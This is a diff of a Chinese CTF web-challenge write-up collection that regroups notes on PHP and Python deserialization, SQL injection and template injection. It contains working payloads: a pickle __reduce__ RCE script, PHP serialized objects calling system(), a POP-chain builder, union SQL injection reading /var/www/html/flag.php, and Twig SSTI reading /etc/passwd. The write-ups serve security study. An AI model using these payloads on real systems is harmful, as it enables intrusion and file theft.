@@ -176,76 +176,6 @@
     ?msg={{handler.settings}}
   ```
 
-## ZJCTF2019 nizhuansiwei(代码审计+php反序列化)
-
-[php(phar)反序列化漏洞及各种绕过姿势](https://pankas.top/2022/08/04/php(phar)%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/)
-
-1. 源码
-
-    ```php
-        <?php  
-        $text = $_GET["text"];
-        $file = $_GET["file"];
-        $password = $_GET["password"];
-        if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
-            echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
-            if(preg_match("/flag/",$file)){
-                echo "Not now!";
-                exit(); 
-            }else{
-                include($file);  //useless.php
-                $password = unserialize($password);
-                echo $password;
-            }
-        }
-        else{
-            highlight_file(__FILE__);
-        }
-        ?> 
-    ```
-
-    get方式提交参数，text、file、password。
-    1. 第一个需要绕过的地方
-        `if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf"))`
-        - `file_get_contents($text,'r')==="welcome to the zjctf"`,从文件里读取字符串，还要和welcome to the zjctf相等。
-  
-            用到`data://`写入协议
-            payload:`?text=data://text/plain,welcome to the zjctf`
-    2. 序列化密码
-        - 不可用flag.php访问,被正则匹配
-
-        ```php
-            if(preg_match("/flag/",$file)){
-                echo "Not now!";
-                exit(); 
-            }else{
-                include($file);  //useless.php
-                $password = unserialize($password);
-                echo $password;
-            }
-        ```
-
-        - 读useless.php:`php://fliter/read=convert.base64-encode/resource=useless.php`,得到base64加密形式的useless.php，解密后得到useless.php源码
-
-        ```php
-            <?php
-            class Flag{  //flag.php 
-                public $file; 
-                public function __tostring(){ 
-                    if(isset($this->file)){ 
-                        echo file_get_contents($this->file);
-                        echo "<br>";
-                    return ("U R SO CLOSE !///COME ON PLZ");
-                    } 
-                } 
-            } 
-            ?> 
-        ```
-
-        得到源码之后，我们将这个源码中的$file赋值flag.php，反序列化一下
-        `./script/serialize.php`,得到反序列化的password
-        payload:`?text=data://text/plain,welcome%20to%20the%20zjctf&file=useless.php&password=O:4:%22Flag%22:1:{s:4:%22file%22;s:8:%22flag.php%22;}`
-
 ## 极客大挑战2019 Hard SQL(报错注入)
 
 - 注入函数
@@ -329,93 +259,108 @@
 
     `1'or(extractvalue(1,concat(0x7e,(select(password)from(H4rDsq1)where(password)regexp('^f')),0x7e)))#`
 
-## 网鼎杯2020 青龙组 反序列化
+## 反序列化
 
-```php
-    <?php
+### python反序列化
 
-    include("flag.php");
+#### CISCN2019华北赛区 Day1 Web2 ikun(JWT python反序列化)
 
-    highlight_file(__FILE__);
+1. 进来看到提示购买lv6，直接翻页找不到,翻页时发现url里有页面索引,直接脚本跑
 
-    class FileHandler {
+    ```python
+    url = 'http://4a471f3e-6f7e-46ab-a7b3-0dec29398943.node5.buuoj.cn:81/shop?page='
+    for i in range(600):
+        urls = url + str(i)
+        res = requests.get(urls)
+        if 'lv6.png' in res.text:
+            print('lv6 in ' + str(i) +' page\n')
+            break
+    ```
 
-        protected $op;
-        protected $filename;
-        protected $content;
+2. lv6在181页，注册账号购买，钱不够，bp抓包，发现有折扣信息，修改折扣
+3. 进入一个新的页面`/b1g_m4mber`,提示只能由admin访问，抓包发现请求头里面有JWT(JSON Web Token,用于身份认证)，用`c-jwt-cracker`破解密钥
+    ```bash
+    ./jwtcrack 密文
+    ```
 
-        function __construct() {
-            $op = "1";
-            $filename = "/tmp/tmpfile";
-            $content = "Hello World!";
-            $this->process();
-        }
+    得到密钥后，需要生成新的jwt，这时可以用brup的JSON Web Token(修改JWT之后，会自动修改抓取数据包中的JWT),将用户名改为admin，放行，成功访问，查看网页源码发现了压缩包
 
-        public function process() {
-            if($this->op == "1") {
-                $this->write();
-            } else if($this->op == "2") {
-                $res = $this->read();
-                $this->output($res);
-            } else {
-                $this->output("Bad Hacker!");
-            }
-        }
+4. 题目一开始也提示了python 和 pickle，即python的反序列化漏洞，
+   
+   关于pickle
 
-        private function write() {
-            if(isset($this->filename) && isset($this->content)) {
-                if(strlen((string)$this->content) > 100) {
-                    $this->output("Too long!");
-                    die();
-                }
-                $res = file_put_contents($this->filename, $this->content);
-                if($res) $this->output("Successful!");
-                else $this->output("Failed!");
-            } else {
-                $this->output("Failed!");
-            }
-        }
+    ```text
+    1. 持续化模块：就是让数据持久化保存。
 
-        private function read() {
-            $res = "";
-            if(isset($this->filename)) {
-                $res = file_get_contents($this->filename);
-            }
-            return $res;
-        }
+    pickle模块是Python专用的持久化模块，可以持久化包括自定义类在内的各种数据，比较适合Python本身复杂数据的存贮。
+    但是持久化后的字串是不可认读的，并且只能用于Python环境，不能用作与其它语言进行数据交换。
 
-        private function output($s) {
-            echo "[Result]: <br>";
-            echo $s;
-        }
+    2. pickle 模块的作用
 
-        function __destruct() {
-            if($this->op === "2")
-                $this->op = "1";
-            $this->content = "";
-            $this->process();
-        }
+    把 Python 对象直接保存到文件里，而不需要先把它们转化为字符串再保存，也不需要用底层的文件访问操作，直接把它们写入到一个二进制文件里。pickle 模块会创建一个 Python 语言专用的二进制格式，不需要使用者考虑任何文件细节，它会帮你完成读写对象操作。用pickle比你打开文件、转换数据格式并写入这样的操作要节省不少代码行。
 
-    }
+    3. 主要方法
+    在pickle中dumps()和loads()操作的是bytes类型，而在使用dump()和lload()读写文件时，要使用rb或wb模式，也就是只接收bytes类型的数据。
+    dumps(): 写
+    loads(): 读
+    loads() 和 dumps() 操作对象都是string
+    load() 和 dump() 操作对象都是文件
+    ```
 
-    function is_valid($s) {
-        for($i = 0; $i < strlen($s); $i++)
-            if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
-                return false;
-        return true;
-    }
+    漏洞在admin.py文件中。
 
-    if(isset($_GET{'str'})) {
+    ```python
+    import tornado.web
+    from sshop.base import BaseHandler
+    import pickle
+    import urllib
 
-        $str = (string)$_GET['str'];
-        if(is_valid($str)) {
-            $obj = unserialize($str);
-        }
 
-    }
-```
+    class AdminHandler(BaseHandler):
+        @tornado.web.authenticated
+        def get(self, *args, **kwargs):
+            if self.current_user == "admin":
+                return self.render('form.html', res='This is Black Technology!', member=0)
+            else:
+                return self.render('no_ass.html')
 
-### 方法一
+        @tornado.web.authenticated
+        def post(self, *args, **kwargs):
+            try:
+                become = self.get_argument('become')
+                p = pickle.loads(urllib.unquote(become))
+                return self.render('form.html', res=p, member=1)
+            except:
+                return self.render('form.html', res='This is Black Technology!', member=0)
+    ```
+
+    借用别人的wp：
+    
+    思路是我们构建一个类，类里面的`__reduce__`魔术方法会在该类被反序列化的时候会被调用,而在`__reduce__`方法里面我们就进行读取flag.txt文件，并将该类序列化之后进行URL编码.
+
+    破解脚本。
+
+    ```python
+    import pickle
+    import urllib
+    import commands
+    
+    
+    class payload(object):
+        def __reduce__(self):
+            return (commands.getoutput,('cat /flag.txt',))
+            # return(commands.getoutput,('ls /'))
+            # return (eval, ("open('/flag.txt','r').read()",))
+    
+    
+    a = pickle.dumps(payload())
+    a = urllib.quote(a)
+    print(a)
+    ```
+
+    得到payload后，利用bp修改become的值为payload
+
+    *注意 : 每次发送请求都要将jwt中的username改为admin*
 
 1. php知识了解
 
@@ -444,7 +389,7 @@
         - ord 用于返回 “S” 的 ASCII值，其语法是ord(string)，参数string必需，指要从中获得ASCII值的字符串
 
     - PHP魔法函数
-        - __wakeup() 在进行unserialize反序列化的时候，首先查看有无该函数有的话就会先执行他
+        1. __wakeup() 在进行unserialize反序列化的时候，首先查看有无该函数有的话就会先执行他
 
             绕过方法：在序列化的时候增加对象属性个数，如：
 
@@ -454,79 +399,19 @@
                 O:4:"xctf":2:{s:4:"flag";s:4:"flag";}
             ```
 
-        - __construct() 实例化对象时被调用
-        - __destruct() 当删除一个对象或对象操作终止时被调用
+        2. __destruct() 当删除一个对象或对象操作终止时被调用
+        3. __construct()  实例化对象时被调用， 当_construct和以类名为函数名的函数同时存在时，_construct将被调用，另一个不被调用。 
+        4. __call()  对象调用某个方法， 若方法存在，则直接调用；若不存在，则会去调用_call函数。 
+        5. __get() 读取一个对象的属性时，若属性存在，则直接返回属性值； 若不存在，则会调用_get函数。 
+        6. __set() 设置一个对象的属性时， 若属性存在，则直接赋值；若不存在，则会调用_set函数。
+        7. __toString() 打印一个对象的时被调用。如echo obj;或printobj; 
+        8. __sleep() serialize之前被调用。若对象比较大，想删减一点再序列化，可考虑一下此函数。 
+        9. __wakeup() unserialize时被调用，做些对象的初始化工作。
+        10. __autoload() 实例化一个对象时，如果对应的类不存在，则该方法被调用。
 
-2. PHP 代码审计
+### php类型一--字符串逃逸
 
-    ```php
-        public function process() {
-            if($this->op == "1") {
-                $this->write();
-            } else if($this->op == "2") {
-                $res = $this->read();
-                $this->output($res);
-            } else {
-                $this->output("Bad Hacker!");
-            }
-        }
-    ```
-
-    op=2，执行read操作
-
-    ```php
-        function is_valid($s) {
-            for($i = 0; $i < strlen($s); $i++)
-                if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
-                    return false;
-            return true;
-        }
-    ```
-
-    php序列化的时候,对于private和protected类型的变量会引入不可见字符，private会引入两个`\x00`(其ascii码为0，url编码为`%00`)；protected变量会引入`\x00*\x00` (三个字符)
-
-    绕过`is_valid()`函数判断，`%00`转化为`\00`;但是在反序列化的时候就会出现问题,所以用"S"替换"s",用来指示`\00`是16进制表示的字符串
-
-    - 序列化代码
-
-    ```php
-        <?php
-
-        class FileHandler{
-            protected $op = 2;
-            protected $filename = "flag.php";
-            protected $content = "";
-        }
-        $a = new FileHandler();
-        $b = urlencode(serialize($a));
-        $b = str_replace("%00", "\\00", $b);
-        $b = str_replace("s", "S", $b);
-        echo($b);
-        echo("\n");
-
-        ?>
-    ```
-
-### 方法二
-
-- 利用php7.1+对属性类型不敏感,直接在本地序列化的时候改变属性类型。
-
-    ```php
-        <?php
-
-        class FileHandler{
-            public $op=2;
-            public $filename="php://filter/read=convert.base64-encode/resource=flag.php";
-            public $content=2;
-        }
-            $a = new FileHandler();
-            echo serialize($a);
-        >?  
-    ```
-
-## (序列化-字符串逃逸)
-
-### 安洵杯2019 easy_serialize_php(extract()变量覆盖)
+#### 安洵杯2019 easy_serialize_php(extract()变量覆盖+反序列化字符串逃逸)
 
 ```php
     function filter($img){
@@ -575,7 +460,7 @@ so:
 
 本地序列化结果: `a:2:{s:10:"img";s:50:";s:3:"111";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}`
 
-### 0CTF2016 piapiapia(备份文件泄露)
+#### 0CTF2016 piapiapia(备份文件泄露+反序列化字符串逃逸)
 
 1. dirsearch 扫描，发现`www.zip`,发现源码
 2. 首先看看config.php，里面有个flag变量
@@ -746,6 +631,495 @@ so:
    wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}
    ```
 
+### 类型二--常规反序列化
+
+[php(phar)反序列化漏洞及各种绕过姿势](https://pankas.top/2022/08/04/php(phar)%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/)
+
+#### ZJCTF2019 nizhuansiwei(代码审计+php反序列化)
+
+1. 源码
+
+    ```php
+        <?php  
+        $text = $_GET["text"];
+        $file = $_GET["file"];
+        $password = $_GET["password"];
+        if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
+            echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
+            if(preg_match("/flag/",$file)){
+                echo "Not now!";
+                exit(); 
+            }else{
+                include($file);  //useless.php
+                $password = unserialize($password);
+                echo $password;
+            }
+        }
+        else{
+            highlight_file(__FILE__);
+        }
+        ?> 
+    ```
+
+2. 代码审计--get方式提交参数，text、file、password。
+    1. 第一个需要绕过的地方
+        `if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf"))`
+        - `file_get_contents($text,'r')==="welcome to the zjctf"`,从文件里读取字符串，还要和welcome to the zjctf相等。
+  
+            用到`data://`写入协议
+            payload:`?text=data://text/plain,welcome to the zjctf`
+    2. 序列化密码
+        - 不可用flag.php访问,被过滤
+
+        ```php
+            if(preg_match("/flag/",$file)){
+                echo "Not now!";
+                exit(); 
+            }else{
+                include($file);  //useless.php
+                $password = unserialize($password);
+                echo $password;
+            }
+        ```
+
+        - 读useless.php:`php://fliter/read=convert.base64-encode/resource=useless.php`,得到base64加密形式的useless.php，解密后得到useless.php源码
+
+        ```php
+            <?php
+            class Flag{  //flag.php 
+                public $file; 
+                public function __tostring(){ 
+                    if(isset($this->file)){ 
+                        echo file_get_contents($this->file);
+                        echo "<br>";
+                    return ("U R SO CLOSE !///COME ON PLZ");
+                    } 
+                } 
+            } 
+            ?> 
+        ```
+
+        得到源码之后，我们将这个源码中的$file赋值flag.php，反序列化一下
+        得到反序列化的password
+        payload:`?text=data://text/plain,welcome%20to%20the%20zjctf&file=useless.php&password=O:4:%22Flag%22:1:{s:4:%22file%22;s:8:%22flag.php%22;}`
+
+#### [网鼎杯 2018]Fakebook(sql注入+php反序列化)
+
+1. 扫描网站目录(御剑/dirsearch)
+
+   会扫到一个叫*robots.txt*的文件,(一般直接扫描到的flag.php直接访问的话是得不到flag的),通过robots.txt中提示的内容会得到一个后台数据展示处理逻辑的源码。通过代码审计发现存在ssrf漏洞
+
+   ```php
+    function get($url)
+    {
+        $ch = curl_init();
+
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        $output = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        if($httpCode == 404) {
+            return 404;
+        }
+        curl_close($ch);
+
+        return $output;
+    }
+   ```
+
+   curl_exec()如果使用不当就会导致ssrf(服务端请求伪造)漏洞
+
+2. 手动注册一个账号，blog处会有验证，输入一个网址就可以
+
+   ```php
+    public function isValidBlog ()
+    {
+        $blog = $this->blog;
+        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
+    }
+   ```
+
+3. 注册完成后登录发现用户处可以点击，进去看到url,no这个地方可能存在注入点，然后就是爆库，爆表等等。
+
+   ```url
+    http://71601955-9748-4b1d-aaae-0fa3e0652d97.node5.buuoj.cn:81/view.php?no=1
+   ```
+
+4. 正式注入，找flag(两种方法)
+    1. 查询数据库信息`?no=-1 union/**/select 1,user(),3,4--+`,发现是root权限。
+            load_file()函数可以利用绝对路径去加载一个文件。load_file(file_name):file_name是一个完整的路径，于是我们直接用var/www/html/flag.php路径去访问一下这个文件。
+
+        payload: `?no=-1 union/**/select 1,load_file("/var/www/html/flag.php"),3,4--+`
+
+    2. 爆列发现存在一个名为data的列，爆data中的内容，发现是序列化后的字符串
+
+        `O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:21;s:4:"blog";s:7:"abc.com";}`
+
+        改动其中的内容
+
+        `O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:19;s:4:"blog";s:29:"file:///var/www/html/flag.php";}`
+
+        payload: `?no=-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:19;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'`
+
+#### 网鼎杯2020 青龙组 反序列化
+
+```php
+    <?php
+
+    include("flag.php");
+
+    highlight_file(__FILE__);
+
+    class FileHandler {
+
+        protected $op;
+        protected $filename;
+        protected $content;
+
+        function __construct() {
+            $op = "1";
+            $filename = "/tmp/tmpfile";
+            $content = "Hello World!";
+            $this->process();
+        }
+
+        public function process() {
+            if($this->op == "1") {
+                $this->write();
+            } else if($this->op == "2") {
+                $res = $this->read();
+                $this->output($res);
+            } else {
+                $this->output("Bad Hacker!");
+            }
+        }
+
+        private function write() {
+            if(isset($this->filename) && isset($this->content)) {
+                if(strlen((string)$this->content) > 100) {
+                    $this->output("Too long!");
+                    die();
+                }
+                $res = file_put_contents($this->filename, $this->content);
+                if($res) $this->output("Successful!");
+                else $this->output("Failed!");
+            } else {
+                $this->output("Failed!");
+            }
+        }
+
+        private function read() {
+            $res = "";
+            if(isset($this->filename)) {
+                $res = file_get_contents($this->filename);
+            }
+            return $res;
+        }
+
+        private function output($s) {
+            echo "[Result]: <br>";
+            echo $s;
+        }
+
+        function __destruct() {
+            if($this->op === "2")
+                $this->op = "1";
+            $this->content = "";
+            $this->process();
+        }
+
+    }
+
+    function is_valid($s) {
+        for($i = 0; $i < strlen($s); $i++)
+            if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
+                return false;
+        return true;
+    }
+
+    if(isset($_GET{'str'})) {
+
+        $str = (string)$_GET['str'];
+        if(is_valid($str)) {
+            $obj = unserialize($str);
+        }
+
+    }
+```
+
+1. 方法一
+
+   - PHP 代码审计
+
+        ```php
+        public function process() {
+            if($this->op == "1") {
+                $this->write();
+            } else if($this->op == "2") {
+                $res = $this->read();
+                $this->output($res);
+            } else {
+                $this->output("Bad Hacker!");
+            }
+        }
+        ```
+
+       op=2，执行read操作
+
+        ```php
+        function is_valid($s) {
+            for($i = 0; $i < strlen($s); $i++)
+                if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
+                    return false;
+            return true;
+        }
+        ```
+
+       php序列化的时候,对于private和protected类型的变量会引入不可见字符，private会引入两个`\x00`(其ascii码为0，url编码为`%00`)；protected变量会引入`\x00*\x00` (三个字符)
+
+       绕过`is_valid()`函数判断，`%00`转化为`\00`;但是在反序列化的时候就会出现问题,所以用"S"替换"s",用来指示`\00`是16进制表示的字符串
+
+       - 序列化代码
+
+       ```php
+           <?php
+
+           class FileHandler{
+               protected $op = 2;
+               protected $filename = "flag.php";
+               protected $content = "";
+           }
+           $a = new FileHandler();
+           $b = urlencode(serialize($a));
+           $b = str_replace("%00", "\\00", $b);
+           $b = str_replace("s", "S", $b);
+           echo($b);
+           echo("\n");
+
+           ?>
+       ```
+
+2. 方法二
+
+   - 利用php7.1+对属性类型不敏感,直接在本地序列化的时候改变属性类型。
+
+    ```php
+        <?php
+
+        class FileHandler{
+            public $op=2;
+            public $filename="php://filter/read=convert.base64-encode/resource=flag.php";
+            public $content=2;
+        }
+            $a = new FileHandler();
+            echo serialize($a);
+        >?  
+    ```
+
+#### 网鼎杯2020 朱雀组 php web(反序列化)
+
+首先bp抓包，发现post传参，测试发现后台用的call_user_func()函数
+
+```php
+    call_user_func()一种调用函数的方法,假设$a=var_dump,$b=abc,这种调用方法就相当于$a($b)，即var_dump(abc)
+```
+
+首先获取源码
+
+```url
+    func=file_get_contents&p=index.php
+```
+
+代码审计后发现，过滤了大部分函数，但是没有过滤`unserialize()`,所以反序列化，这样就能绕过黑名单检测从而执行系统命令
+
+构造序列化的代码
+
+```php
+    <?php
+
+    class Test{
+        var $p = "ls /";  //查看flag是否在根目录
+        // var $p = "find / -name 'flag*'";  //查找flag
+        // var $p = "cat /tmp/flagoefiu4r93";  //获取flag
+        var $func = "system";
+    }
+    $a = new Test();
+    $b = serialize($a);
+    echo($b);
+    ?>
+```
+
+***这道题也有另一种解法***
+
+在php中，函数加上\号不会影响函数本身，因为in_array函数过滤不够严谨，所以我们可以利用加上\号来绕过该函数，直接命令执行，构造payload，先找一下flag位置
+
+```url
+    func=\system&p=p=find / -name flag*
+```
+
+### 类型三--反序列化pop链
+
+#### MRCTF2020 easypop(PHP魔术方法+反序列化)
+
+- 源码
+
+    ```php
+        <?php
+        //flag is in flag.php
+        //WTF IS THIS?
+        //Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
+        //And Crack It!
+        class Modifier {
+            protected  $var;
+            public function append($value){
+                include($value);
+            }
+            public function __invoke(){
+                $this->append($this->var);
+            }
+        }
+        class Show{
+            public $source;
+            public $str;
+            public function __construct($file='index.php'){
+                $this->source = $file;
+                echo 'Welcome to '.$this->source."<br>";
+            }
+            public function __toString(){
+                return $this->str->source;
+            }
+        
+            public function __wakeup(){
+                if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
+                    echo "hacker";
+                    $this->source = "index.php";
+                }
+            }
+        }
+        class Test{
+            public $p;
+            public function __construct(){
+                $this->p = array();
+            }
+            public function __get($key){
+                $function = $this->p;
+                return $function();
+            }
+        }
+        if(isset($_GET['pop'])){
+            @unserialize($_GET['pop']);
+        }
+        else{
+            $a=new Show;
+            highlight_file(__FILE__);
+        }
+    ```
+
+- 代码审计
+
+    从非定义部分的代码开始审查。
+
+    ```php
+        if(isset($_GET['pop'])){
+            @unserialize($_GET['pop']);
+        }
+        else{
+            $a=new Show;
+            highlight_file(__FILE__);
+        }
+    ```
+
+    在传入参数pop被设置时对其进行反序列化，那么再查看此前定义的类中哪些具有和反序列化相关的魔术方法，调用这些魔术方法中设置的代码，就可以执行此处反序列化之外更多的代码，从而实现我们读取flag.php中flag的要求。
+
+    ```php
+        class Modifier {
+            protected  $var;
+            public function append($value){
+                include($value);
+            }
+            public function __invoke(){
+                $this->append($this->var);
+            }
+        }
+    ```
+
+    Modifier类中append()方法会将传入参数包含，而此处魔术方法__invoke中设置了将Modifier类中的var属性作为传入值来调用append()函数，所以在这里需要让属性var的值为flag.php，再触发魔术方法__invoke即可。
+
+    魔术方法__invoke被自动调用的条件是类被当成一个函数被调用，故接着来寻找和函数调用有关的代码。
+
+    ```php
+        class Show{
+            public $source;
+            public $str;
+            public function __construct($file='index.php'){
+                $this->source = $file;
+                echo 'Welcome to '.$this->source."<br>";
+            }
+            public function __toString(){
+                return $this->str->source;
+            }
+        
+            public function __wakeup(){
+                if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
+                    echo "hacker";
+                    $this->source = "index.php";
+                }
+            }
+        }
+    ```
+
+    在Test类中有两个魔法函数__construct和__get，但魔法函数__construct这里用不上只需要关注魔法函数__get就好。魔法函数__get中设置了属性p会被当做函数调用，刚好符合前面Modifier类中的要求。故需要再触发魔法函数__get即可
+
+    魔法函数__get会在访问类中一个不存在的属性时自动调用，那就需要寻找和调用属性相关的代码。
+
+    ```php
+        class Test{
+            public $p;
+            public function __construct(){
+                $this->p = array();
+            }
+            public function __get($key){
+                $function = $this->p;
+                return $function();
+            }
+        }
+    ```
+
+    Show类中有三个魔术方法
+
+    在魔术方法__toString中会返回属性str中的属性source，如果刚刚提到的source属性不存在，那么就符合了Test类中的要求
+
+    魔术方法__toString在类被当做一个字符串处理时会被自动调用，在魔术方法__wakeup则将属性source传入正则匹配函数preg_match()，在这个函数中source属性就被当做字符串处理。
+
+    最终这个魔术方法__wakeup又在类被反序列化时自动调用。
+
+    这样从Test类中append()方法到Show类中的魔术方法__wakup就形成了一条调用链，这就是POP的一个使用样例，而题目——Ezpop就说明了这题设计的知识。
+
+    整个过程：
+
+    反序列化->调用Show类中魔术方法__wakeup->preg_match()函数对Show类的属性source处理->调用Show类中魔术方法__toString->返回Show类的属性str中的属性source(此时这里属性source并不存在)->调用Test类中魔术方法__get->返回Test类的属性p的函数调用结果->调用Modifier类中魔术方法__invoke->include()函数包含目标文件(flag.php)
+
+    构造payload的代码(读取flag.php中的flag需要伪协议)：
+
+    ```php
+        <?php
+        class Modifier {
+            protected  $var="flag.php";
+        }
+        class Show{
+            public $source;
+            public $str;
+        }
+        class Test{
+            public $p;
+        }
+        $a = new Show();
+        $b= new Show();
+        $a->source=$b;
+        $b->str=new Test();
+        ($b->str)->p=new Modifier();
+        echo urlencode(serialize($a));
+    ```
 
 ## SUCTF2019 CheckIn(文件上传漏洞)
 
@@ -899,64 +1273,6 @@ WEB-INF是java的WEB应用的安全目录，此外如果想在页面访问WEB-IN
 servlet包含了路径信息，我们尝试包含一下FlagController所在路径，不过这次要在前面加上classes来访问来访问class文件目录（详见上面的目录结构），且文件后缀为.class
 
 这道题需要将请求方式改为POST，GET方式得不到想要的东西
-
-## [网鼎杯 2018]Fakebook(sql注入+php反序列化)
-
-1. 扫描网站目录(御剑/dirsearch)
-
-   会扫到一个叫*robots.txt*的文件,(一般直接扫描到的flag.php直接访问的话是得不到flag的),通过robots.txt中提示的内容会得到一个后台数据展示处理逻辑的源码。通过代码审计发现存在ssrf漏洞
-
-   ```php
-    function get($url)
-    {
-        $ch = curl_init();
-
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-        $output = curl_exec($ch);
-        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        if($httpCode == 404) {
-            return 404;
-        }
-        curl_close($ch);
-
-        return $output;
-    }
-   ```
-
-   curl_exec()如果使用不当就会导致ssrf(服务端请求伪造)漏洞
-
-2. 手动注册一个账号，blog处会有验证，输入一个网址就可以
-
-   ```php
-    public function isValidBlog ()
-    {
-        $blog = $this->blog;
-        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
-    }
-   ```
-
-3. 注册完成后登录发现用户处可以点击，进去看到url,no这个地方可能存在注入点，然后就是爆库，爆表等等。
-
-   ```url
-    http://71601955-9748-4b1d-aaae-0fa3e0652d97.node5.buuoj.cn:81/view.php?no=1
-   ```
-
-4. 正式注入，找flag(两种方法)
-    1. 查询数据库信息`?no=-1 union/**/select 1,user(),3,4--+`,发现是root权限。
-            load_file()函数可以利用绝对路径去加载一个文件。load_file(file_name):file_name是一个完整的路径，于是我们直接用var/www/html/flag.php路径去访问一下这个文件。
-
-        payload: `?no=-1 union/**/select 1,load_file("/var/www/html/flag.php"),3,4--+`
-
-    2. 爆列发现存在一个名为data的列，爆data中的内容，发现是序列化后的字符串
-
-        `O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:21;s:4:"blog";s:7:"abc.com";}`
-
-        改动其中的内容
-
-        `O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:19;s:4:"blog";s:29:"file:///var/www/html/flag.php";}`
-
-        payload: `?no=-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:19;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'`
 
 ## SSIT(服务端模板注入)
 ### WesternCTF2018 shrine
@@ -1269,47 +1585,6 @@ Twig
     {{[0,0]|reduce("system","id")|join(",")}}
 
     {{['cat /etc/passwd']|filter('system')}}
-```
-
-## 网鼎杯2020 朱雀组 php web(反序列化)
-
-首先bp抓包，发现post传参，测试发现后台用的call_user_func()函数
-
-```php
-    call_user_func()一种调用函数的方法,假设$a=var_dump,$b=abc,这种调用方法就相当于$a($b)，即var_dump(abc)
-```
-
-首先获取源码
-
-```url
-    func=file_get_contents&p=index.php
-```
-
-代码审计后发现，过滤了大部分函数，但是没有过滤`unserialize()`,所以反序列化，这样就能绕过黑名单检测从而执行系统命令
-
-构造序列化的代码
-
-```php
-    <?php
-
-    class Test{
-        var $p = "ls /";  //查看flag是否在根目录
-        // var $p = "find / -name 'flag*'";  //查找flag
-        // var $p = "cat /tmp/flagoefiu4r93";  //获取flag
-        var $func = "system";
-    }
-    $a = new Test();
-    $b = serialize($a);
-    echo($b);
-    ?>
-```
-
-***这道题也有另一种解法***
-
-在php中，函数加上\号不会影响函数本身，因为in_array函数过滤不够严谨，所以我们可以利用加上\号来绕过该函数，直接命令执行，构造payload，先找一下flag位置
-
-```url
-    func=\system&p=p=find / -name flag*
 ```
 
 ## PHP伪协议
@@ -1897,168 +2172,6 @@ if (isset($_GET['get_flag'])){
             a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
             &b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
         ```
-
-## MRCTF2020 easypop(PHP魔术方法+反序列化)
-
-- 源码
-
-    ```php
-        <?php
-        //flag is in flag.php
-        //WTF IS THIS?
-        //Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
-        //And Crack It!
-        class Modifier {
-            protected  $var;
-            public function append($value){
-                include($value);
-            }
-            public function __invoke(){
-                $this->append($this->var);
-            }
-        }
-        class Show{
-            public $source;
-            public $str;
-            public function __construct($file='index.php'){
-                $this->source = $file;
-                echo 'Welcome to '.$this->source."<br>";
-            }
-            public function __toString(){
-                return $this->str->source;
-            }
-        
-            public function __wakeup(){
-                if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
-                    echo "hacker";
-                    $this->source = "index.php";
-                }
-            }
-        }
-        class Test{
-            public $p;
-            public function __construct(){
-                $this->p = array();
-            }
-            public function __get($key){
-                $function = $this->p;
-                return $function();
-            }
-        }
-        if(isset($_GET['pop'])){
